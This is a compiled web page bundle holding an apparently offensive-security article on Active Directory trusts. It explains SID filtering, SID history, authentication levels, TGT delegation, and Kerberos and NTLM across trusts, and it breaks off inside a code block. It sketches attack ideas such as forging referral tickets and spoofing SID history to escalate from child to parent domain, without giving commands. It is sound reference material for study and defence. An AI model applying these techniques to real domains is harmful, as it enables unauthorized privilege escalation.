import{_ as h,c as d,a5 as o,G as a,w as i,B as l,o as c,j as e,a as t}from"./chunks/framework.B5CpDqM0.js";const p="/assets/SID%20filtering%20default%20configs.BWeXqOoS.png",u="/assets/SID%20filtering%20custom%20configs.CB0x9lVQ.png",m="/assets/MS%20PAC%20section%204.1.2.2.Cmw5BXcP.png",D=JSON.parse('{"title":"Trusts","description":"","frontmatter":{"authors":"ShutdownRepo"},"headers":[],"relativePath":"ad/movement/trusts/index.md","filePath":"ad/movement/trusts/index.md","lastUpdated":1724982529000}'),f={name:"ad/movement/trusts/index.md"};function g(b,s,k,y,w,v){const r=l("PluginTabsTab"),n=l("PluginTabs");return c(),d("div",null,[s[4]||(s[4]=o('<h1 id="trusts" tabindex="-1">Trusts <a class="header-anchor" href="#trusts" aria-label="Permalink to &quot;Trusts&quot;">​</a></h1><h2 id="theory" tabindex="-1">Theory <a class="header-anchor" href="#theory" aria-label="Permalink to &quot;Theory&quot;">​</a></h2><div class="warning custom-block"><p>Attacking Active Directory trust relationships requires a good understanding of a lot of concepts (what forests and domains are, how trusts work, what security mechanisms are involved and how they work, ...). Consequently, this page is lengthy, especially in the <a href="./index#theory">theory</a> and <a href="./index#resources">resources</a> parts, but I did my best to include all the necessary info here.</p><p><strong>Pro tip</strong>: use the page outline on the right panel, to brwose it more easily.</p></div><h3 id="forest-domains-trusts" tabindex="-1">Forest, domains &amp; trusts <a class="header-anchor" href="#forest-domains-trusts" aria-label="Permalink to &quot;Forest, domains &amp; trusts&quot;">​</a></h3><p>An Active Directory domain is a collection of computers, users, and other resources that are all managed together. A domain has its own security database, which is used to authenticate users and computers when they log in or access resources within the domain.</p><p>A forest is a collection of one or more Active Directory domains that share a common schema, configuration, and global catalog. The schema defines the kinds of objects that can be created within the forest, and the global catalog is a centralized database that contains a searchable, partial replica of every domain in the forest.</p><p>Trust relationships between domains allow users in one domain to access resources in another domain. There are several types of trust relationships that can be established, including one-way trusts, two-way trusts, external trusts, etc.</p><p>Once a trust relationship is established between a trusting domain (A) and trusted domain (B), users from the trusted domain can authenticate to the trusting domain&#39;s resources. In other -more technical- terms, trusts extend the security boundary of a domain or forest.</p><div class="tip custom-block"><p>Simply establishing a trust relationship does not automatically grant access to resources. In order to access a &quot;trusting&quot; resource, a &quot;trusted&quot; user must have the appropriate permissions to that resource. These permissions can be granted by adding the user to a group that has access to the resource, or by giving the user explicit permissions to the resource.</p><p>A trust relationship allows users in one domain to authenticate to the other domain&#39;s resources, but it does not automatically grant access to them. Access to resources is controlled by permissions, which must be granted explicitly to the user in order for them to access the resources.</p></div><h3 id="global-catalog" tabindex="-1">Global Catalog <a class="header-anchor" href="#global-catalog" aria-label="Permalink to &quot;Global Catalog&quot;">​</a></h3><p>The global catalog is a partial copy of all objects in an Active Directory forest, meaning that some object properties (but not all) are contained within it. This data is replicated among all domain controllers marked as global catalogs for the forest. One of the Global Catalog&#39;s purposes is to facilitate quick object searching and conflict resolution without the necessity of referring to other domains <a href="https://technet.microsoft.com/en-us/library/cc978012.aspx" target="_blank" rel="noreferrer">(more information here)</a>.</p><p>The initial global catalog is generated on the first domain controller created in the first domain in the forest. The first domain controller for each new child domain is also set as a global catalog by default, but others can be added.</p><p>The GC allows both users and applications to find information about any objects in ANY domain in the forest. The Global Catalog performs the following functions:</p><ul><li>Authentication (provided authorization for all groups that a user account belongs to, which is included when an access token is generated)</li><li>Object search (making the directory structure within a forest transparent, allowing a search to be carried out across all domains in a forest by providing just one attribute about an object.)</li></ul><h3 id="trust-types" tabindex="-1">Trust types <a class="header-anchor" href="#trust-types" aria-label="Permalink to &quot;Trust types&quot;">​</a></h3><p>The <code>trustType</code> attribute of a TDO specifies the type of trust that is established. Here are the different trust types (section <a href="https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/36565693-b5e4-4f37-b0a8-c1b12138e18e" target="_blank" rel="noreferrer">6.1.6.7.15 &quot;trustType&quot;</a> of [MS-ADTS]):</p><ol><li>Downlevel: a trust with a domain that is running a version of Windows NT 4.0 or earlier.</li><li>Uplevel: a trust with a domain that is running Windows 2000 or later.</li><li>MIT: a trust with a non-Windows Kerberos realm, typically used for interoperability with UNIX-based systems running MIT Kerberos.</li><li>DCE: not used in Windows. Would refer to trusts with a domain running <a href="http://www.opengroup.org/dce/info/" target="_blank" rel="noreferrer">DCE</a>.</li><li>AAD: the trusted domain is in Azure Active Directory.</li></ol><h3 id="trust-flavor" tabindex="-1">Trust flavor <a class="header-anchor" href="#trust-flavor" aria-label="Permalink to &quot;Trust flavor&quot;">​</a></h3><p>The trust &quot;flavor&quot;, on the other hand, represents the nature of the trust relationship between domains or forests. It is not a direct attribute but is identified based on other TDO attributes (see <a href="https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2003/cc773178(v=ws.10)#trust-types" target="_blank" rel="noreferrer">&quot;How Domain and Forest Trusts Work &gt; Trust Types&quot;</a>).</p><ol><li>Parent-Child: this type of trust relationship exists between a parent domain and a child domain in the same forest. The parent domain trusts the child domain, and the child domain trusts the parent domain. This type of trust is automatically created when a new child domain is created in a forest.</li><li>Tree-Root: exists between the root domain of a tree and the root domain of another tree in the same forest. This type of trust is automatically created when a new tree is created in a forest.</li><li>Shortcut (a.k.a. cross-link): exists between two child domains of different tree (i.e. different parent domains) within the same forest. This type of trust relationship is used to reduce the number of authentication hops between distant domains. It is a one-way or two-way transitive trust.</li><li>External: exists between a domain in one forest and a domain in a different forest. It allows users in one domain to access resources in the other domain. It&#39;s usually set up when accessing resources in a forest without trust relationships established.</li><li>Forest: exists between two forests (i.e. between two root domains in their respective forest). It allows users in one forest to access resources in the other forest.</li><li>Realm: exists between a Windows domain and a non-Windows domain, such as a Kerberos realm. It allows users in the Windows domain to access resources in the non-Windows domain.</li></ol><table tabindex="0"><thead><tr><th>Trust type</th><th>Transitivity</th><th>Direction</th><th>Auth. mechanisms</th><th>Creation mode</th></tr></thead><tbody><tr><td>Parent-Child</td><td>Transitive</td><td>Two-way</td><td>Either</td><td>Automatic</td></tr><tr><td>Tree-Root</td><td>Transitive</td><td>Two-way</td><td>Either</td><td>Automatic</td></tr><tr><td>Shortcut (a.k.a. cross-link)</td><td>Transitive</td><td>Either</td><td>Either</td><td>Manual</td></tr><tr><td>Realm</td><td>Either</td><td>Either</td><td>Kerberos V5 only</td><td>Manual</td></tr><tr><td>Forest</td><td>Transitive</td><td>Either</td><td>Either</td><td>Manual</td></tr><tr><td>External</td><td>Non-transitive</td><td>One-way</td><td>NTLM only</td><td>Manual</td></tr></tbody></table><h3 id="transitivity" tabindex="-1">Transitivity <a class="header-anchor" href="#transitivity" aria-label="Permalink to &quot;Transitivity&quot;">​</a></h3><p>In Active Directory, a transitive trust is a type of trust relationship that allows access to resources to be passed from one domain to another. When a transitive trust is established between two domains, any trusts that have been established with the first domain are automatically extended to the second domain. This means that if Domain A trusts Domain B and Domain B trusts Domain C, then Domain A automatically trusts Domain C, even if there is no direct trust relationship between Domain A and Domain C. Transitive trusts are useful in large, complex networks where multiple trust relationships have been established between many different domains. They help to simplify the process of accessing resources and reduce the number of authentication hops that may be required.</p><div class="tip custom-block"><p>The transitivity status of a trust depends on the <a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/e9a2d23c-c31e-4a6f-88a0-6646fdb51a3c" target="_blank" rel="noreferrer">trustAttributes</a> flags of a <a href="https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/b645c125-a7da-4097-84a1-2fa7cea07714#gt_f2ceef4e-999b-4276-84cd-2e2829de5fc4" target="_blank" rel="noreferrer">TDO</a>.</p><blockquote><ul><li>If the <code>TRUST_ATTRIBUTE_NON_TRANSITIVE (0x00000001)</code> flag is set then the transitivity is disabled.</li><li>If the <code>TRUST_ATTRIBUTE_WITHIN_FOREST (0x00000020)</code> flag is set then the transitivity is enabled.</li><li>If the <code>TRUST_ATTRIBUTE_FOREST_TRANSITIVE (0x00000008)</code> flag is set then the transitivity is enabled.</li></ul><p>In any other case the transitivity is disabled.</p><p><em>(by</em> <a href="https://twitter.com/0xcsandker" target="_blank" rel="noreferrer"><em>Carsten Sandker</em></a> <em>on</em> <a href="https://www.securesystems.de/blog/active-directory-spotlight-trusts-part-2-operational-guidance/" target="_blank" rel="noreferrer"><em>www.securesystems.de</em></a><em>)</em></p></blockquote></div><h3 id="sid-filtering" tabindex="-1">SID filtering <a class="header-anchor" href="#sid-filtering" aria-label="Permalink to &quot;SID filtering&quot;">​</a></h3><p>According to Microsoft, the security boundary in Active Directory is the forest, not the domain. The forest defines the boundaries of trust and controls access to resources within the forest.</p><p>The domain is a unit within a forest and represents a logical grouping of users, computers, and other resources. Users within a domain can access resources within their own domain and can also access resources in other domains within the same forest, as long as they have the appropriate permissions. Users cannot access resources in other forests unless a trust relationship has been established between the forests.</p><p>SID filtering plays an important role in the security boundary by making sure &quot;only SIDs from the trusted domain will be accepted for authorization data returned during authentication. SIDs from other domains will be removed&quot; (<code>netdom</code> cmdlet output). By default, SID filtering is disabled for intra-forest trusts, and enabled for inter-forest trusts.</p><p><img src="'+p+'" alt=""></p><p class="caption">Default configurations (source: <a href="https://www.securesystems.de/blog/active-directory-spotlight-trusts-part-2-operational-guidance/" target="_blank" rel="noreferrer">securesystems.de</a>)</p><p><img src="'+u+'" alt=""></p><p class="caption">Custom configurations (source: <a href="https://www.securesystems.de/blog/active-directory-spotlight-trusts-part-2-operational-guidance/" target="_blank" rel="noreferrer">securesystems.de</a>)</p><p>Section <a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-pac/55fc19f2-55ba-4251-8a6a-103dd7c66280" target="_blank" rel="noreferrer">4.1.2.2</a> of [MS-PAC] specifies what is filtered and when. There are three important things to remember from this documentation:</p><ul><li>if SID filtering is fully enabled, all SIDs that differ from the trusted domain will be filtered out</li><li>even if it&#39;s enabled, a few SIDs will (almost) never be filtered: &quot;Enterprise Domain Controllers&quot; (S-1-5-9) SID and those described by the <a href="https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-pac/f2ef15b6-1e9b-48b5-bf0b-019f061d41c8#gt_f2ceef4e-999b-4276-84cd-2e2829de5fc4" target="_blank" rel="noreferrer">trusted domain object (TDO)</a>, as well as seven well-known SIDs (see <a href="https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-pac/55fc19f2-55ba-4251-8a6a-103dd7c66280" target="_blank" rel="noreferrer">MS-PAC doc</a>, and <a href="https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-3-sid-filtering-explained#yui_3_17_2_1_1673614140169_543" target="_blank" rel="noreferrer">improsec&#39;s blogpost</a>).</li><li>there are two kinds of inter-forest trusts: &quot;Forest&quot;, and &quot;External&quot; (see <a href="./index#trust-types">trust types</a>). Microsoft says &quot;<a href="https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-dtyp/81d92bba-d22b-4a8c-908a-554ab29148ab?redirectedfrom=MSDN" target="_blank" rel="noreferrer">cross-forest trusts are more stringently filtered than external trusts</a>&quot;, meaning that in External trusts, SID filtering only filters out RID &lt; 1000.</li></ul><p><img src="'+m+`" alt=""></p><p class="caption">[MS-PAC] section 4.1.2.2</p><div class="tip custom-block"><p>The SID filtering status of a trust depends on the <a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/e9a2d23c-c31e-4a6f-88a0-6646fdb51a3c" target="_blank" rel="noreferrer">trustAttributes</a> flags of a <a href="https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/b645c125-a7da-4097-84a1-2fa7cea07714#gt_f2ceef4e-999b-4276-84cd-2e2829de5fc4" target="_blank" rel="noreferrer">TDO</a> as well as the type of trust.</p><blockquote><ul><li>If the <code>TRUST_ATTRIBUTE_QUARANTINED_DOMAIN (0x00000004)</code> flag is set, then only SIDs from the trusted domain are allowed (all others are filtered</li></ul><p><em>(by</em> <a href="https://twitter.com/0xcsandker" target="_blank" rel="noreferrer"><em>Carsten Sandker</em></a> <em>on</em> <a href="https://www.securesystems.de/blog/active-directory-spotlight-trusts-part-2-operational-guidance/" target="_blank" rel="noreferrer"><em>www.securesystems.de</em></a><em>)</em></p><ul><li>If the <code>TRUST_ATTRIBUTE_TREAT_AS_EXTERNAL (0x00000040)</code> flag is set, then inter-forest ticket can be forged, spoofing an RID &gt;= 1000. Of course, this doesn&#39;t apply if TAQD (<code>TRUST_ATTRIBUTE_QUARANTINED_DOMAIN</code>) is set.</li></ul><p><em>(sources: section</em> <a href="https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/e9a2d23c-c31e-4a6f-88a0-6646fdb51a3c?redirectedfrom=MSDN" target="_blank" rel="noreferrer"><em>6.1.6.7.9</em></a> <em>of [MS-ADTS], and section</em> <a href="https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-pac/55fc19f2-55ba-4251-8a6a-103dd7c66280" target="_blank" rel="noreferrer"><em>4.1.2.2</em></a> <em>of [MS-PAC]).</em></p></blockquote><p>Above are some key, usually valid, elements. But as <a href="https://twitter.com/0xcsandker" target="_blank" rel="noreferrer">Carsten Sandker</a> puts it: &quot;the logic that sits behind this might be too complex to put it in text&quot;. To really know the behavior of SID filtering for a trust, refer to the lookup tables <a href="https://www.securesystems.de/images/blog/active-directory-spotlight-trusts-part-2-operational-guidance/OC-b4We5WFiXhTirzI_Dyw.png" target="_blank" rel="noreferrer">here</a> (for default trusts setups) and <a href="https://www.securesystems.de/images/blog/active-directory-spotlight-trusts-part-2-operational-guidance/99icUS7SKCscWq6VzW0o5g.png" target="_blank" rel="noreferrer">there</a> (for custom configs).</p></div><div class="tip custom-block"><p>SID filtering is not unique to trusts. It occurs &quot;<a href="https://twitter.com/SteveSyfuhs/status/1329148611305693185" target="_blank" rel="noreferrer">whenever a service ticket is accepted</a>&quot; either by the KDC or by a local service and behaves differently depending on the contect in which the ticket was produced.</p><p>Also, SID filtering works the same way for NTLM and Kerberos. It&#39;s a separate mechanism invoked after user logon info are unpacked (more details in <a href="./index#ntlm-authentication">NTLM</a> and <a href="./index#kerberos-authentication">Kerberos</a> chapters).</p></div><h3 id="sid-history" tabindex="-1">SID history <a class="header-anchor" href="#sid-history" aria-label="Permalink to &quot;SID history&quot;">​</a></h3><p>The SID (Security Identifier) is a unique identifier that is assigned to each security principal (e.g. user, group, computer). It is used to identify the principal within the domain and is used to control access to resources.</p><p>The SID history is a property of a user or group object that allows the object to retain its SID when it is migrated from one domain to another as part of a domain consolidation or restructuring. When an object is migrated to a new domain, it is assigned a new SID in the target domain. The SID history allows the object to retain its original SID, so that access to resources in the source domain is not lost.</p><p>Many resources across the Internet, including Microsoft&#39;s docs and tools, state that SID history can be enabled across a trust. This is not 100% true. SID history is not a feature that can be toggled on or off per say.</p><p>When authenticating across trusts <a href="./index#kerberos-authentication">using Kerberos</a>, it is assumed that the extra SID field of the ticket&#39;s PAC (Privileged Attribute Certificate) reflects the SID history attribute of the authenticating user. With <a href="./index#sid-filtering">SID filtering</a> enabled in a trust, the SIDs contained in that field are filtered, effectively preventing SID history from doing its job. There are certain scenarios where some SIDs are not filtered, allowing for example SIDs with a RID &gt;= 1000. Some, including Microsoft, call it &quot;enabling SID history&quot;, but in fact, SID history is not toggled on or off here, it&#39;s the behavior of SID filtering that is adjusted. I&#39;d call that &quot;partial SID filtering&quot;, or &quot;unencumbered SID history&quot;. <a href="https://twitter.com/_dirkjan" target="_blank" rel="noreferrer">Dirk-jan Mollema</a> calls that &quot;<a href="https://dirkjanm.io/active-directory-forest-trusts-part-one-how-does-sid-filtering-work/#sid-filtering-relaxation" target="_blank" rel="noreferrer">SID filtering relaxation</a>&quot;.</p><p>When authenticating with NTLM, the process is highly similar, see the <a href="./index#ntlm-authentication">NTLM authentication</a> theory chapter for more information.</p><h3 id="authentication-level" tabindex="-1">Authentication level <a class="header-anchor" href="#authentication-level" aria-label="Permalink to &quot;Authentication level&quot;">​</a></h3><p>Inter-forest trusts (&quot;External&quot; and &quot;Forest&quot; trusts) can be configured with different levels of authentication:</p><ul><li>Forest-wide authentication: allows unrestricted authentication from the trusted forest&#39;s principals to the trusting forest&#39;s resources. This is the least secure level, it completely opens one forest to another (authentication-wise though, not access-wise). This level is specific to intra-forest trusts.</li><li>Domain-wide authentication: allows unrestricted authentication from the trusted domain&#39;s principals to the trusting domain&#39;s resources. This is more secure than forest-wide authentication because it only allows users in a specific (trusted) domain to access resources in another (trusting).</li><li>Selective authentication: allows only specific users in the trusted domain to access resources in the trusting domain. This is the most secure type of trust because it allows administrators to tightly control access to resources in the trusted domain. In order to allow a &quot;trusted user&quot; to access a &quot;trusting resource&quot;, the resource&#39;s DACL must include an ACE in which the trusted user has the &quot;<code>Allowed-To-Authenticate</code>&quot; extended right (GUID: <code>68b1d179-0d15-4d4f-ab71-46152e79a7bc</code>).</li></ul><p>It&#39;s worth noting that selective authentication is less used by the general public due to its complexity, but it&#39;s definitely the most restrictive, hence secure, choice.</p><div class="tip custom-block"><p>The authentication level of a trust depends on the <a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/e9a2d23c-c31e-4a6f-88a0-6646fdb51a3c" target="_blank" rel="noreferrer">trustAttributes</a> flags of a <a href="https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/b645c125-a7da-4097-84a1-2fa7cea07714#gt_f2ceef4e-999b-4276-84cd-2e2829de5fc4" target="_blank" rel="noreferrer">TDO</a>.</p><blockquote><ul><li>If the trust relationship is made within a forest boundary (aka if the <code>TRUST_ATTRIBUTE_WITHIN_FOREST (0x00000020)</code> flag is set), then Forest-Wide Authentication will always be used.</li><li>f the trust relationship crosses a forest boundary and the <code>TRUST_ATTRIBUTE_CROSS_ORGANIZATION (0x00000010)</code> flag is set then Selective Authentication is used.</li><li>If the trust relationship crosses a forest boundary, but the trust is marked as transitive (aka if the <code>TRUST_ATTRIBUTE_FOREST_TRANSITIVE (0x00000008)</code> flag is set), then Forest-Wide Authentication will be used.</li></ul><p>In any other case Domain-Wide Authentication is used.</p><p><em>Interesting to note: Trusts within a Forest always use Forest-Wide Authentication (and this can not be disabled).</em></p><p><em>(by</em> <a href="https://twitter.com/0xcsandker" target="_blank" rel="noreferrer"><em>Carsten Sandker</em></a> <em>on</em> <a href="https://www.securesystems.de/blog/active-directory-spotlight-trusts-part-2-operational-guidance/" target="_blank" rel="noreferrer"><em>www.securesystems.de</em></a><em>)</em></p></blockquote></div><h3 id="tgt-delegation" tabindex="-1">TGT delegation <a class="header-anchor" href="#tgt-delegation" aria-label="Permalink to &quot;TGT delegation&quot;">​</a></h3><p>Kerberos unconstrained delegation (KUD) allows a service configured for it to impersonate (almost) any user on any other service. This is a dangerous feature to configure, that won&#39;t be explained into many details here as the <a href="./../kerberos/index#delegations">Kerberos</a>, <a href="./../kerberos/delegations/index">Kerberos delegations</a> and <a href="./../kerberos/delegations/unconstrained">Kerberos unconstrained delegations</a> pages already cover it.</p><p>Kerberos unconstrained delegations could be abused across trusts to take control over any resource of the trusting domain, including the domain controller, as long as the trusted domain is compromised. This relies on the delegation of TGT across trusts, which can be disabled.</p><p>If TGT delegation is disabled in a trust, attackers won&#39;t be able to <a href="./index#unconstrained-delegation-abuse">escalate from one domain to another by abusing unconstrained delegation</a>. On a side note, the other types of delegations are not affected by this as they don&#39;t rely on the delegation of tickets, but on S4U extensions instead.</p><div class="tip custom-block"><p>The TGT delegation status of a trust depends on the <a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/e9a2d23c-c31e-4a6f-88a0-6646fdb51a3c" target="_blank" rel="noreferrer">trustAttributes</a> flags of a <a href="https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/b645c125-a7da-4097-84a1-2fa7cea07714#gt_f2ceef4e-999b-4276-84cd-2e2829de5fc4" target="_blank" rel="noreferrer">TDO</a>.</p><blockquote><ul><li>If the <code>TRUST_ATTRIBUTE_CROSS_ORGANIZATION_NO_TGT_DELEGATION (0x00000200)</code> flag is set, then TGT Delegation is disabled.</li><li>If the <code>TRUST_ATTRIBUTE_QUARANTINED_DOMAIN (0x00000004)</code> flag is set, then TGT Delegation is disabled.</li><li>If the <code>TRUST_ATTRIBUTE_CROSS_ORGANIZATION_ENABLE_TGT_DELEGATION (0x00000800)</code>flag is set, then TGT Delegation is enabled.</li><li>If the <code>TRUST_ATTRIBUTE_WITHIN_FOREST (0x00000020)</code> flag is set, then TGT Delegation is enabled.</li></ul><p><em>(by</em> <a href="https://twitter.com/0xcsandker" target="_blank" rel="noreferrer"><em>Carsten Sandker</em></a> <em>on</em> <a href="https://www.securesystems.de/blog/active-directory-spotlight-trusts-part-2-operational-guidance/" target="_blank" rel="noreferrer"><em>www.securesystems.de</em></a><em>)</em></p></blockquote></div><h3 id="kerberos-authentication" tabindex="-1">Kerberos authentication <a class="header-anchor" href="#kerberos-authentication" aria-label="Permalink to &quot;Kerberos authentication&quot;">​</a></h3><p>Understanding how Kerberos works is required here: <a href="./../kerberos/index">the Kerberos protocol</a>.</p><blockquote><p>For a Kerberos authentication to occur across a domain trust, the Kerberos key distribution centers (KDCs) in two domains must have a shared secret, called an inter-realm key. This key is <a href="https://msdn.microsoft.com/en-us/library/windows/desktop/aa378170(v=vs.85).aspx" target="_blank" rel="noreferrer">derived from a shared password</a>, and rotates approximately every 30 days. Parent-child domains share an inter-realm key implicitly.</p><p>When a user in domain A tries to authenticate or access a resource in domain B that he has established access to, he presents his ticket-granting-ticket (TGT) and request for a service ticket to the KDC for domain A. The KDC for A determines that the resource is not in its realm, and issues the user a referral ticket.</p><p>This referral ticket is a ticket-granting-ticket (TGT) encrypted with the inter-realm key shared by domain A and B. The user presents this referral ticket to the KDC for domain B, which decrypts it with the inter-realm key, checks if the user in the ticket has access to the requested resource, and issues a service ticket. This process is described in detail in <a href="https://technet.microsoft.com/en-us/library/cc772815(v=ws.10).aspx#w2k3tr_kerb_how_pzvx" target="_blank" rel="noreferrer">Microsoft’s documentation</a> in the Simple Cross-Realm Authentication and Examples section.</p><p><em>(by</em> <a href="https://twitter.com/harmj0y" target="_blank" rel="noreferrer"><em>Will Schroeder</em></a> <em>on</em> <a href="https://blog.harmj0y.net/redteaming/domain-trusts-were-not-done-yet/" target="_blank" rel="noreferrer"><em>blog.harmj0y.net</em></a><em>)</em></p></blockquote><p>From an offensive point of view, just like a <a href="./../kerberos/forged-tickets/golden">golden ticket</a>, a referral ticket could be forged. Forging a referral ticket using the inter-realm key, instead of relying on the krbtgt keys for a golden ticket, is a nice alternative for organizations that choose to roll their krbtgt keys, as they should. This technique is <a href="https://dirkjanm.io/active-directory-forest-trusts-part-two-trust-transitivity/#do-you-need-to-use-inter-realm-tickets" target="_blank" rel="noreferrer">a little bit trickier</a> though, as it requires to <a href="https://dirkjanm.io/active-directory-forest-trusts-part-two-trust-transitivity/#which-keys-do-i-need-for-inter-realm-tickets" target="_blank" rel="noreferrer">use the correct key</a>.</p><p>Depending on the trust characteristics, ticket forgery can also be combined with <a href="./index#sid-history">SID history</a> spoofing for a direct privilege escalation from a child to a parent domain.</p><p>When doing Kerberos authentications across trusts, the trusting domain&#39;s domain controller <a href="https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-kile/bac4dc69-352d-416c-a9f4-730b81ababb3" target="_blank" rel="noreferrer">checks a few things</a> before handing out service tickets to trusted users: <a href="./index#sid-filtering">SID filtering</a> during <a href="https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-pac/55fc19f2-55ba-4251-8a6a-103dd7c66280" target="_blank" rel="noreferrer">PAC validation</a> (looking in the <code>ExtraSids</code> attribute from the <a href="https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-pac/69e86ccc-85e3-41b9-b514-7d969cd0ed73" target="_blank" rel="noreferrer"><code>KERB_VALIDATION_INFO</code></a> structure in the PAC), <a href="./index#tgt-delegation">TGT delegation</a> verification (when asked for a Service Ticket for a service configured for unconstrained delegation), and <a href="./index#authentication-level">Selective Authentication</a> limitation.</p><h3 id="ntlm-authentication" tabindex="-1">NTLM authentication <a class="header-anchor" href="#ntlm-authentication" aria-label="Permalink to &quot;NTLM authentication&quot;">​</a></h3><p>In an NTLM authentication sequence, a user authenticates to a resource by sending an NTLM Negotiate message, receiving an NTLM Challenge, and then sending back an NTLM Authenticate. The server then passes the logon request through to the Domain Controller, using the Netlogon Remote Protocol.</p><blockquote><p>This mechanism of delegating the authentication request to a DC is called pass-through authentication.</p><p>Upon successful validation of the user credentials on the DC, the Netlogon Remote Protocol delivers the user authorization attributes (referred to as user validation information) back to the server over the secure channel.</p><p><em>(</em><a href="https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-nrpc/70697480-f285-4836-9ca7-7bb52f18c6af" target="_blank" rel="noreferrer"><em>Microsoft.com</em></a><em>)</em></p></blockquote><p>When using NTLM across trust relationships, the process is very similar.</p><p>When a trusted domain&#39;s user wants to access a resource from a trusting domain, the user and the resource engage in the standard 3-way NTLM handshake. Upon receiving the NTLM Authenticate message, the resource forwards it to its own domain controller through a Netlogon &quot;<a href="https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-nrpc/08b36439-331a-4e20-89a5-12f3fab33dfc" target="_blank" rel="noreferrer">workstation secure channel</a>&quot;. The trusting DC forwards it as well to the trusted domain&#39;s DC through a Netlogon &quot;<a href="https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-nrpc/08b36439-331a-4e20-89a5-12f3fab33dfc" target="_blank" rel="noreferrer">trusted domain secure channel</a>&quot;.</p><p>The trusted domain&#39;s DC does the usual checks and passes the result to the trusting DC, which in turn passes it to the resource. The resource then accepts or rejects the authentication based on the decision passed through the DCs.</p><p>When doing NTLM authentications across trusts, the trusting domain&#39;s domain controller checks a few things from the user info structure supplied by the trusted domain controller: <a href="./index#sid-filtering">SID filtering</a> (looking in the <code>ExtraSids</code> attribute from the <a href="https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-nrpc/2a12e289-7904-4ecb-9d83-6732200230c0" target="_blank" rel="noreferrer"><code>NETLOGON_VALIDATION_SAM_INFO2</code></a> structure), and <a href="./index#authentication-level">Selective Authentication</a> limitation during the <a href="https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-apds/f47e40e1-b9ca-47e2-b139-15a1e96b0e72" target="_blank" rel="noreferrer">DC&#39;s validation of the user credentials</a>. <a href="./index#tgt-delegation">TGT delegation</a> verification doesn&#39;t occur here, since it&#39;s a Kerberos mechanism.</p><p><em>Nota bene, wether it&#39;s Kerberos or NTLM, the ExtraSids are in the same data structure, it&#39;s just named differently for each protocol. And, the SID filtering function called by the trusting DC is the same, for both authentication protocols.</em></p><h3 id="mim-pam-bastion-red-forests" tabindex="-1">MIM PAM &amp; Bastion (Red Forests) <a class="header-anchor" href="#mim-pam-bastion-red-forests" aria-label="Permalink to &quot;MIM PAM &amp; Bastion (Red Forests)&quot;">​</a></h3><div class="tip custom-block"><p>The following section is a light adaptation of <a href="https://www.labofapenetrationtester.com/2019/04/abusing-PAM.html" target="_blank" rel="noreferrer">Nikhil Mittal&#39;s</a> and <a href="https://secureidentity.se/msds-shadowprincipal/" target="_blank" rel="noreferrer">Daniel Ulrichs&#39;s</a> work.</p></div><p>Microsoft introduced MIM (Microsoft Identity Manager) Privileged Access Management (PAM) with Server 2016, including the following features. (Sometimes PAM is also referred to as PIM in some docs/links).</p><ul><li>A Bastion forest (i.e. forest in ESAE (Enhanced Security Admin Environment), a.k.a. Red Forest)</li><li>Shadow Security Principals (i.e. admins in Bastion Forest can be mapped as Domain Admins or a &quot;User Forest&quot;)</li><li>Temporary group membership (i.e. add a user to a group with a time-to-live (TTL))</li></ul><p>PAM enables the management of an existing &quot;Production Forest&quot; (one can think of that as a User Forest as well) using a &quot;Bastion Forest&quot; which has a one-way PAM trust with the existing forest. The users in the Bastion Forest can be &#39;mapped&#39; to privileged groups like &quot;Domain Admins&quot; and &quot;Enterprise Admins&quot; in the Production Forest without modifying any group memberships or ACLs. This takes away the administrative overhead and reduces the chances of lateral movement techniques.</p><p>This is done by creating &quot;Shadow Security Principals&quot; in the Bastion Forest, which are mapped to SIDs for high-privileged groups in the User Forest, and then adding users from the Bastion Forest as members of the Shadow Security Principals.</p><details class="details custom-block"><summary>More technical notes</summary><p>The main Active Directory Objects and Attributes related to the Bastion Forest are the following:</p><ol><li><code>msDS-ShadowPrincipalContainer</code>: dedicated container class for <code>msDS-ShadowPrincipal</code> objects. One default container (<code>CN=Shadow Principal Configuration</code>) is created in the Services container in the Configuration NC on the Bastion Forest). NB: Privileged Containers can be created in other locations as well, however, Kerberos will NOT work there.</li><li><code>msDS-ShadowPrincipal</code>: principal from an external forest (Bastion Forest). Has the <code>msDS-ShadowPrincipalSid</code> attribute and can only be in a Shadow Principal container. Any principal may be represented by a Shadow Principal. If the Shadow Principal is in the default container (mentioned above), Kerberos tickets will embed the group membership (in the same forest) of the principal referenced by the Shadow Principal. If a TTL value of the membership is set it will integrate with Kerberos and the lifetime of the tickets will be set to the shortest expiring TTL value.</li><li><code>msDS-ShadowPrincipalSid</code>: This attribute contains the SID of a principal from an external forest. SIDs from a domain of the same forest cannot be added. To be able to add SIDs from another Domain, a Forest Trust must be configured between them. This means that at least a one-way incoming Forest Trust from the Domain that holds the Shadow Principals must be configured. This attribute is also indexed.</li></ol><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span>Bastion ROOT (DC=BASTION,DC=LOCAL)</span></span>
<span class="line"><span>├── Configuration Naming Context (CN=Configuration)</span></span>
<span class="line"><span>│ ├── Services (CN=Services)</span></span>
